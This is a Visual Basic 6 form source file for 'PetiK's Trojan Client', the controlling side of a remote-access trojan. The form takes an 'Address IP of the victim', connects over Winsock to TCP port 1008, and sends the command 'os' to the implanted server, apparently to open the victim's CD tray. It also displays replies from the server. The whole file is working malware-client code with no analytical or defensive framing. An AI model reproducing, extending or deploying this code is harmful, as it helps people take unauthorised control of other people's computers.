VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H80000008&
   Caption         =   "PetiK's Trojan Client (Version 1.0)"
   ClientHeight    =   6495
   ClientLeft      =   990
   ClientTop       =   2730
   ClientWidth     =   9375
   LinkTopic       =   "Form1"
   ScaleHeight     =   6495
   ScaleWidth      =   9375
   Begin VB.CommandButton opcd 
      Caption         =   "OPEN CD"
      Height          =   495
      Left            =   7200
      TabIndex        =   8
      Top             =   600
      Width           =   1455
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H80000008&
      Caption         =   "Frame2"
      ForeColor       =   &H000000FF&
      Height          =   4215
      Left            =   120
      TabIndex        =   6
      Top             =   1800
      Width           =   6375
      Begin VB.TextBox txt 
         BackColor       =   &H80000008&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FF00&
         Height          =   3855
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   7
         Top             =   240
         Width           =   6135
      End
   End
   Begin MSWinsockLib.Winsock ws 
      Left            =   5040
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000008&
      Caption         =   "Connection"
      ForeColor       =   &H000000FF&
      Height          =   1335
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   4575
      Begin VB.CommandButton butdisc 
         Caption         =   "DISCONNECT"
         Enabled         =   0   'False
         Height          =   495
         Left            =   2160
         TabIndex        =   4
         Top             =   720
         Width           =   1815
      End
      Begin VB.CommandButton butc 
         Caption         =   "CONNECT"
         Height          =   495
         Left            =   120
         TabIndex        =   3
         Top             =   720
         Width           =   1815
      End
      Begin VB.TextBox szip 
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   2160
         MaxLength       =   15
         TabIndex        =   2
         Top             =   240
         Width           =   1815
      End
      Begin VB.Label Label1 
         BackColor       =   &H80000008&
         Caption         =   "Address IP of the victim :"
         ForeColor       =   &H0000FFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   1815
      End
   End
   Begin VB.Label status 
      BackColor       =   &H80000008&
      Caption         =   "Ready..."
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   255
      Left            =   120
      TabIndex        =   5
      Top             =   6120
      Width           =   9135
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim idx As Integer

Private Sub butc_Click()
If szip.Text = "" Then
    MsgBox "PLEASE PUT THE IP ADDRESS", vbCritical, "Warning !"
    Exit Sub
End If
c = 0
For i = 1 To Len(szip.Text)
    a = Mid(szip.Text, i, 1)
    If a = "." Then
        c = c + 1
    End If
Next
If c <> 3 Then
    MsgBox "INVALID IP ADDRESS", vbCritical, "Warning !"
    Exit Sub
End If
status.Caption = "Connected to " & szip.Text & ":1008"
ws.RemoteHost = szip.Text
ws.RemotePort = 1008
ws.Connect
butc.Enabled = False
butdisc.Enabled = True
szip.Enabled = False
End Sub

Private Sub butdisc_Click()
status.Caption = "Ready..."
ws.Close
szip.Text = ""
butc.Enabled = True
butdisc.Enabled = False
szip.Enabled = True
End Sub

Private Sub Command1_Click()
If ws.State <> sckConnected Then
MsgBox "Not connection to server", vbCritical, "Error"
Else
MsgBox "Connection to server", vbCritical, "Error"

End If
End Sub

Private Sub Form_Load()
Dim ps As Integer
If Not EnableTransparanty(Me.hwnd, 0) = 0 Then
    Me.Show
Else
    Me.Enabled = False
    Me.Show
    For ps = 0 To 255
        DoEvents
        Call EnableTransparanty(Me.hwnd, ps)
        DoEvents
    Next
    Me.Enabled = True
    idx = 0
End If
End Sub

Private Sub opcd_Click()
If ws.State <> sckConnected Then
MsgBox "No connection", , sckConnected
Else
ws.SendData "os"
End If
End Sub

Private Sub ws_Connect()
txt.Text = ""
status.Caption = "Connected to " & szip.Text & " on port " & ws.RemotePort & " TCP"
szip.Enabled = False
End Sub

Private Sub ws_DataArrival(ByVal bytesTotal As Long)
Dim txtr As String
ws.GetData txtr
If Right(txtr, 2) = "-R" Then
txt.Text = txtr
End If
End Sub

Private Sub ws_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
MsgBox Description, vbCritical, "Error !"
If ws.State <> sckClosed Then
    ws.Close
End If
status.Caption = "   Not connected"
szip.Text = ""
butc.Enabled = True
butdisc.Enabled = False
szip.Enabled = True
End Sub
